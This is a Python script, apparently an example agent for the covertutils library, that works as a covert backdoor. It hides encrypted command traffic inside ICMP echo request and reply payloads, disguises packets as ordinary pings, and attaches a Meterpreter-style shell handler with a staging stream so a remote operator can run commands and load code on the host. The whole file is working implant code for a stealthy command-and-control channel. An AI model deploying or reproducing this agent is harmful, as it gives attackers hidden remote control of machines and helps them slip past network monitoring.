#!/usr/bin/env python
#============================== Imports part =============================

from covertutils.orchestration import SimpleOrchestrator
from covertutils.handlers import ResponseOnlyHandler, FunctionDictHandler
from covertutils.handlers.impl import ExtendableShellHandler, MeterpreterShellHandler

from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
from scapy.all import send as scapy_send	# unexpected things will happen

from threading import Thread		# Need a thread for running a sniffer
from time import sleep			# I spin lock a lot
from random import randint		# Generating IP id field needs randomness

passphrase = "pass"		# Passphrase hardcoded in handler. Could also be encrypted.

#============================== Networking part ===========================
# The networking is handled by Python and Scapy. No 'covertutils' code here...

icmp_packets = []		# Packets captured by sniffer will be stored here
packet_info = []		# List of packet information collected for the handler to know where to respond


def add_icmp_packet( pkt ) :	# wrapper function to add a packet to the list
	global icmp_packets
	icmp_packets.append( pkt )


def collect_icmp() :		# Scappy non terminating sniffer
	cap_filter = "icmp[icmptype] == icmp-echo"		# that captures echos
	sniff( filter = cap_filter, prn = add_icmp_packet )	 # runs forever


def recv( ) :		# Networking Wrapper function needed for the handler
	while not icmp_packets :	# Blocks when no packet is available
		sleep(0.01)

	pkt = icmp_packets.pop(0)	# Get the first packet
	timestamp = str(pkt[Raw])[:4]	# Keep the timestamp to use it on the response
	raw_data = str(pkt[Raw])[4:]			# remove the timestamp and get the raw data
	#	Keep a track of the packet information as it may be from the Handler
	packet_info.insert( 0, (pkt[IP].src, pkt[IP].dst, pkt[ICMP].seq, pkt[ICMP].id, timestamp ) )
	#	If it is from the Handler a response will be made using that information
	return raw_data


def send( raw_data ) :
	ip_id = randint( 0, 65535 )		# To simulate real packets
	handler_ip, self_ip, icmp_seq, icmp_id, timestamp = packet_info[0]	# extract the data from the packet that will be answered
	paylaod = timestamp + raw_data	# the payload starts with UNIX time to simulate real ping
	pkt = IP( dst = handler_ip, src = self_ip, id = ip_id )/ICMP( type = "echo-reply", seq = icmp_seq, id = icmp_id )/Raw( paylaod )
	scapy_send( pkt, verbose = False )		# Make and send a Raw Packet


sniff_thread = Thread( target = collect_icmp )
sniff_thread.daemon = True
sniff_thread.start()			# Run the ICMP echo collector in a thread
#==========================================================================




#============================== Handler Overriding part ===================

# A dict that designates what function is going to run if Messages come from certain streams
# _function_dict = { 'control' : GenericStages['shell']['function'],
# 					'main' : GenericStages['shell']['function']
# 					}
# Here all streams will be used for a typical 'system' function (raw shell).
# FEEL FREE TO CREATE YOUR OWN!

#	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
#	FunctionDictHandler to set the dict of functions run on messages
class AgentHandler( ResponseOnlyHandler, MeterpreterShellHandler ) :

	def __init__(self, recv, send, orch, **kwargs) :
		super(AgentHandler, self).__init__(recv, send, orch, **kwargs )


	def onNotRecognised( self ) :	# When Junk arrives
		global packet_info	# It means that the packet is not created by Handler
		del packet_info[0]	# So the packet's info get deleted as the Agent won't respond to it
		# print "[!] Unrecognised"


	def onChunk( self, stream, message ) :	# When a Chunk arrives
		# print "[+] Got Chunk!"
		if not message :	# If it is not a complete message (but a part of one)
			self.onMessage( stream, self.request_data )	# Treat it as message containing the `self.request_data` string


	def onMessage( self, stream, message ) :	# When a Chunk arrives
		# print "[%] Got a Message!"
		if message == self.request_data :	# If the Message contains the `self.request_data` string
			ret_stream, ret_message = stream, message	# The message to be responded will contain the same value
		else :		# Else pass it through the function pointed by the function dict
			ret_message = MeterpreterShellHandler.onMessage( self, stream, message )

		responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Run the ResponseOnlyHandler onMessage
		# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)
		while not responded :		# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
			self.queueSend( ret_message, stream );	# Make it respond anyway with 'ResponseOnlyHandler.request_data' (see Client)
			responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Now it will responde for sure as a message is manually added to the queue
			# assert responded == True		# This way we know it responsed!
#==========================================================================



#=============================Handler Creation=============================

orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from the passphrase
				tag_length = 3,		# The tag length in bytes
				out_length = 52,	# The absolute output byte length (with tags)
				in_length = 52,		# The absolute input byte length (with tags)
				streams = ['heartbeat'],	# Stream 'control' will be automatically added as failsafe mechanism
				reverse = False )	# Reverse the encryption channels - Handler has `reverse = True`

agent = AgentHandler( recv, send, orchestrator,			# Instantiate the Handler object. Finally!
					# function_dict = _function_dict,  	# needed as of the FunctionDictHandler overriding
					stage_stream = 'stage'
					)
#==========================================================================


# Wait forever as all used threads are daemonized
while 1 :	sleep(10)	# Magic!
